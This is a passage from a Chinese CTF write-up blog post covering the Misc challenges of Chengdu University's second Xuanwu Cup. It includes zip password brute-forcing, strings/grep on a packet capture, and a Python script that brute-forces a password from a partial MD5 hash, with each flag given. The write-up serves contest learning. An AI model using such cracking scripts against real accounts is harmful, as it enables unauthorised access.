+<hr>
+<h3 id="Solution-19"><a href="#Solution-19" class="headerlink" title="Solution:"></a>Solution:</h3><p>用<code>Ziperello</code>爆破即可，密码为<code>f0rC3</code></p>
+<hr>
+<h3 id="Flag-19"><a href="#Flag-19" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Aestheticization_of_violence&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="流量分析题"><a href="#流量分析题" class="headerlink" title="流量分析题"></a>流量分析题</h2><h3 id="Description-20"><a href="#Description-20" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>附件: <a href="https://ctf.cdusec.com/upload/flag.pcapng" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/flag.pcapng</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-20"><a href="#Solution-20" class="headerlink" title="Solution:"></a>Solution:</h3><p>因为是招新赛，估计 flag 是摆在明面上的，直接用 strings 命令了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings flag.pcapng | grep flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-20"><a href="#Flag-20" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;tcpip_is_awesome&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码是啥"><a href="#密码是啥" class="headerlink" title="密码是啥"></a>密码是啥</h2><h3 id="Description-21"><a href="#Description-21" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>有一天郭大佬忘了后台管理密码是啥，只记得密码的不加盐md5前四位是b996，后三位是3e2，长度为5.大小写都有，你能帮忙找到后台管理密码吗？<br>flag格式:flag{*****}</p>
+</blockquote>
+<hr>
+<h3 id="Solution-21"><a href="#Solution-21" class="headerlink" title="Solution:"></a>Solution:</h3><p>写脚本爆破即可，不过有两个情况都满足，不是出的很好</p>
+<p><strong>exp如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str_enc = <span class="string">''</span></span><br><span class="line">s = string.ascii_letters</span><br><span class="line">s = s[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> str_enc</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> s:</span><br><span class="line">    str_enc += i1</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> s:</span><br><span class="line">        str_enc += i2</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> s:</span><br><span class="line">            str_enc += i3</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> s:</span><br><span class="line">                str_enc += i4</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> s:</span><br><span class="line">                    str_enc += i5</span><br><span class="line">                    hsh = hashlib.md5(str_enc).hexdigest()</span><br><span class="line">                    <span class="keyword">print</span> str_enc</span><br><span class="line">                    <span class="keyword">if</span> hsh[<span class="number">0</span>: <span class="number">4</span>] == <span class="string">'b996'</span> <span class="keyword">and</span> hsh[<span class="number">-3</span>:] == <span class="string">'3e2'</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'hsh     = '</span> + hsh</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'str_enc = '</span> + str_enc</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'flag    = flag&#123;'</span> + str_enc + <span class="string">'&#125;'</span></span><br><span class="line">                        exit(<span class="number">1337</span>)</span><br><span class="line">                    str_enc = str_enc[: <span class="number">-1</span>]</span><br><span class="line">                str_enc = str_enc[: <span class="number">-1</span>]</span><br><span class="line">            str_enc = str_enc[: <span class="number">-1</span>]</span><br><span class="line">        str_enc = str_enc[: <span class="number">-1</span>]</span><br><span class="line">    str_enc = str_enc[: <span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+
+<p>一个情况是<code>CdHsh</code>，对应<code>b99648ad338f83a9ace00e19f97b53e2</code><br>另一个情况是<code>FjcOy</code>，对应<code>b9966524dbef725a3ad170446855d3e2</code></p>
+<hr>
+<h3 id="Flag-21"><a href="#Flag-21" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CdHsh&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="">【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">binLep</a></p>
+        <p><span>发布时间:</span>2019-11-17, 16:17:00</p>
+        <p><span>最后更新:</span>2019-11-17, 16:22:40</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="" title="【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解">http://binlep.github.io/2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://binlep.github.io/2019/11/18/【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解/　　作者: binLep" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="../../../12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/">
+                    【WriteUp】攻防世界--Pwn题解(Part 2)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="../../05/【WriteUp】Hackme CTF--Pwn题解/">
+                    【WriteUp】Hackme CTF--Pwn题解
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">1.1.</span> <span class="toc-text">GET</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">1.1.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">1.2.</span> <span class="toc-text">POST</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#百度"><span class="toc-number">1.3.</span> <span class="toc-text">百度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-1"><span class="toc-number">1.4.</span> <span class="toc-text">SQL-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WeekPassword"><span class="toc-number">1.5.</span> <span class="toc-text">WeekPassword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4"><span class="toc-number">1.5.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialization-1"><span class="toc-number">1.6.</span> <span class="toc-text">serialization-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-5"><span class="toc-number">1.6.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#矛盾"><span class="toc-number">1.7.</span> <span class="toc-text">矛盾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-6"><span class="toc-number">1.7.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有趣的上传点"><span class="toc-number">1.8.</span> <span class="toc-text">有趣的上传点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-7"><span class="toc-number">1.8.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash"><span class="toc-number">1.9.</span> <span class="toc-text">Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-8"><span class="toc-number">1.9.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-8"><span class="toc-number">1.9.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-8"><span class="toc-number">1.9.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#计算题"><span class="toc-number">2.1.</span> <span class="toc-text">计算题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-9"><span class="toc-number">2.1.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-9"><span class="toc-number">2.1.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-9"><span class="toc-number">2.1.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一千次Flag"><span class="toc-number">2.2.</span> <span class="toc-text">一千次Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-10"><span class="toc-number">2.2.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-10"><span class="toc-number">2.2.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-10"><span class="toc-number">2.2.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你会用Android-Studio吗"><span class="toc-number">2.3.</span> <span class="toc-text">你会用Android Studio吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-11"><span class="toc-number">2.3.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-11"><span class="toc-number">2.3.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-11"><span class="toc-number">2.3.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猜数？"><span class="toc-number">2.4.</span> <span class="toc-text">猜数？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-12"><span class="toc-number">2.4.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-12"><span class="toc-number">2.4.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-12"><span class="toc-number">2.4.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-number">2.5.</span> <span class="toc-text">python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-13"><span class="toc-number">2.5.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-13"><span class="toc-number">2.5.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-13"><span class="toc-number">2.5.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell"><span class="toc-number">3.1.</span> <span class="toc-text">Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-14"><span class="toc-number">3.1.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-14"><span class="toc-number">3.1.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-14"><span class="toc-number">3.1.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#G1F"><span class="toc-number">4.1.</span> <span class="toc-text">G1F</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-15"><span class="toc-number">4.1.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-15"><span class="toc-number">4.1.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-15"><span class="toc-number">4.1.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Base"><span class="toc-number">4.2.</span> <span class="toc-text">Base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-16"><span class="toc-number">4.2.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-16"><span class="toc-number">4.2.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-16"><span class="toc-number">4.2.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">4.3.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-17"><span class="toc-number">4.3.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-17"><span class="toc-number">4.3.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-17"><span class="toc-number">4.3.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#键盘密码"><span class="toc-number">4.4.</span> <span class="toc-text">键盘密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-18"><span class="toc-number">4.4.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-18"><span class="toc-number">4.4.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-18"><span class="toc-number">4.4.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大力出奇迹"><span class="toc-number">4.5.</span> <span class="toc-text">大力出奇迹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-19"><span class="toc-number">4.5.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-19"><span class="toc-number">4.5.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-19"><span class="toc-number">4.5.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量分析题"><span class="toc-number">4.6.</span> <span class="toc-text">流量分析题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-20"><span class="toc-number">4.6.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-20"><span class="toc-number">4.6.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-20"><span class="toc-number">4.6.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#密码是啥"><span class="toc-number">4.7.</span> <span class="toc-text">密码是啥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-21"><span class="toc-number">4.7.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-21"><span class="toc-number">4.7.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-21"><span class="toc-number">4.7.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="../../../12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/" title="上一篇: 【WriteUp】攻防世界--Pwn题解(Part 2)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="../../05/【WriteUp】Hackme CTF--Pwn题解/" title="下一篇: 【WriteUp】Hackme CTF--Pwn题解">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/24/【Pwn 笔记】Linux 命令注入一览/">【Pwn 笔记】Linux 命令注入一览</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/24/【WrtieUp】BJDCTF 2nd -- Pwn 题解/">【WrtieUp】BJDCTF 2nd -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/21/【WrtieUp】CISCN 2019 -- Pwn 题解/">【WrtieUp】CISCN 2019 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/20/【Pwn 笔记】跨平台架构的环境配置与调试/">【Pwn 笔记】跨平台架构的环境配置与调试</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/12/【Pwn 笔记】Linux Kernel 调试命令总结/">【Pwn 笔记】Linux Kernel 调试命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/12/【Pwn 笔记】Linux Kernel 总结 -- ROP/">【Pwn 笔记】Linux Kernel 总结 -- Kernel-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/12/【Pwn 笔记】Linux Kernel 调试文件总结/">【Pwn 笔记】Linux Kernel 调试文件总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/">【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/">【Pwn 笔记】栈溢出利用总结 -- Advanced ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/29/【Crypto 笔记】古典密码学习/">【Crypto 笔记】古典密码学习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/28/【Pwn 笔记】使程序重复循环的技巧/">【Pwn 笔记】使程序重复循环的技巧</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/28/【Web 笔记】md5 绕过总结/">【Web 笔记】Md5 绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/28/【Web 笔记】关于 SSTI 注入/">【Web 笔记】关于 SSTI 注入及绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/25/【杂项】磁盘阵列知识梳理/">【杂项】磁盘阵列知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/25/【SQL 笔记】绕过技术总结/">【SQL 笔记】绕过技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/18/【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户/">【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/17/【Blockchain】区块链的环境搭建/">【Blockchain】区块链的环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/16/【WriteUp】HGAME 2020--Pwn题解/">【WriteUp】HGAME 2020--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/15/【WriteUp】ACTF 2020 题解/">【WriteUp】ACTF 2020 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/02/【Misc 笔记】流量分析篇/">【Misc 笔记】流量分析篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/24/【Pwn 笔记】Android Kernel 环境搭建/">【Pwn 笔记】Android Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/13/【Pwn 笔记】Linux Kernel 环境搭建/">【Pwn 笔记】Linux Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/13/【WriteUp】SCTF 2019--Pwn题解/">【WriteUp】SCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/12/【WriteUp】RoarCTF 2019--Pwn题解/">【WriteUp】RoarCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/">【Pwn 笔记】简单记如何利用 Ret2_dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/04/【WriteUp】安恒杯元旦月赛--Pwn题解/">【WriteUp】安恒杯元旦月赛--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/03/【汇编学习】mips 寄存器/">【汇编学习】Mips 寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/03/【汇编学习】mips 指令集/">【汇编学习】Mips 指令集</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/30/【WriteUp】kksctf open 2019--Pwn题解/">【WriteUp】#kksctf Open 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/25/【WriteUp】攻防世界--Pwn题解(Part 3)/">【WriteUp】攻防世界--Pwn题解(Part 3)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/25/【Pwn 笔记】函数中的宏常量定义/">【Pwn 笔记】函数中的宏常量定义</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/24/【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解/">【WriteUp】第三届“华为杯”XMan冬令营选拔赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/16/【Pwn 笔记】格式化字符串总结/">【Pwn 笔记】格式化字符串总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/">【WriteUp】攻防世界--Pwn题解(Part 2)</a></li><li class="post-list-item"><a class="post-list-link" href="">【WriteUp】成都大学第二届玄武杯CTF信息安全竞赛题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../05/【WriteUp】Hackme CTF--Pwn题解/">【WriteUp】Hackme CTF--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../03/【学习总结】Python沙箱逃逸/">【学习总结】Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/28/【Docker】Docker使用教程/">【Docker】Docker使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/28/【Docker】Docker安装教程/">【Docker】Docker安装教程</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/28/【WriteUp】RSCTF 2019 题解/">【WriteUp】RSCTF 2019 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/15/【Pwn 笔记】堆利用总结/">【Pwn 笔记】堆利用总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/14/【WriteUp】CryptixCTF'19 题解/">【WriteUp】CryptixCTF'19 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/05/【WriteUp】攻防世界--Pwn题解(Part 1)/">【WriteUp】攻防世界--Pwn题解(Part 1)</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/03/【WriteUp】MOCTF--web题解/">【WriteUp】MOCTF--Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/02/【杂项】一些网站汇总/">【杂项】一些网站汇总</a></li><li class="post-list-item"><a class="post-list-link" href="../../../09/28/【WriteUp】Newark Academy CTF 2019 题解/">【WriteUp】Newark Academy CTF 2019 题解</a></li><li class="post-list-item"><a 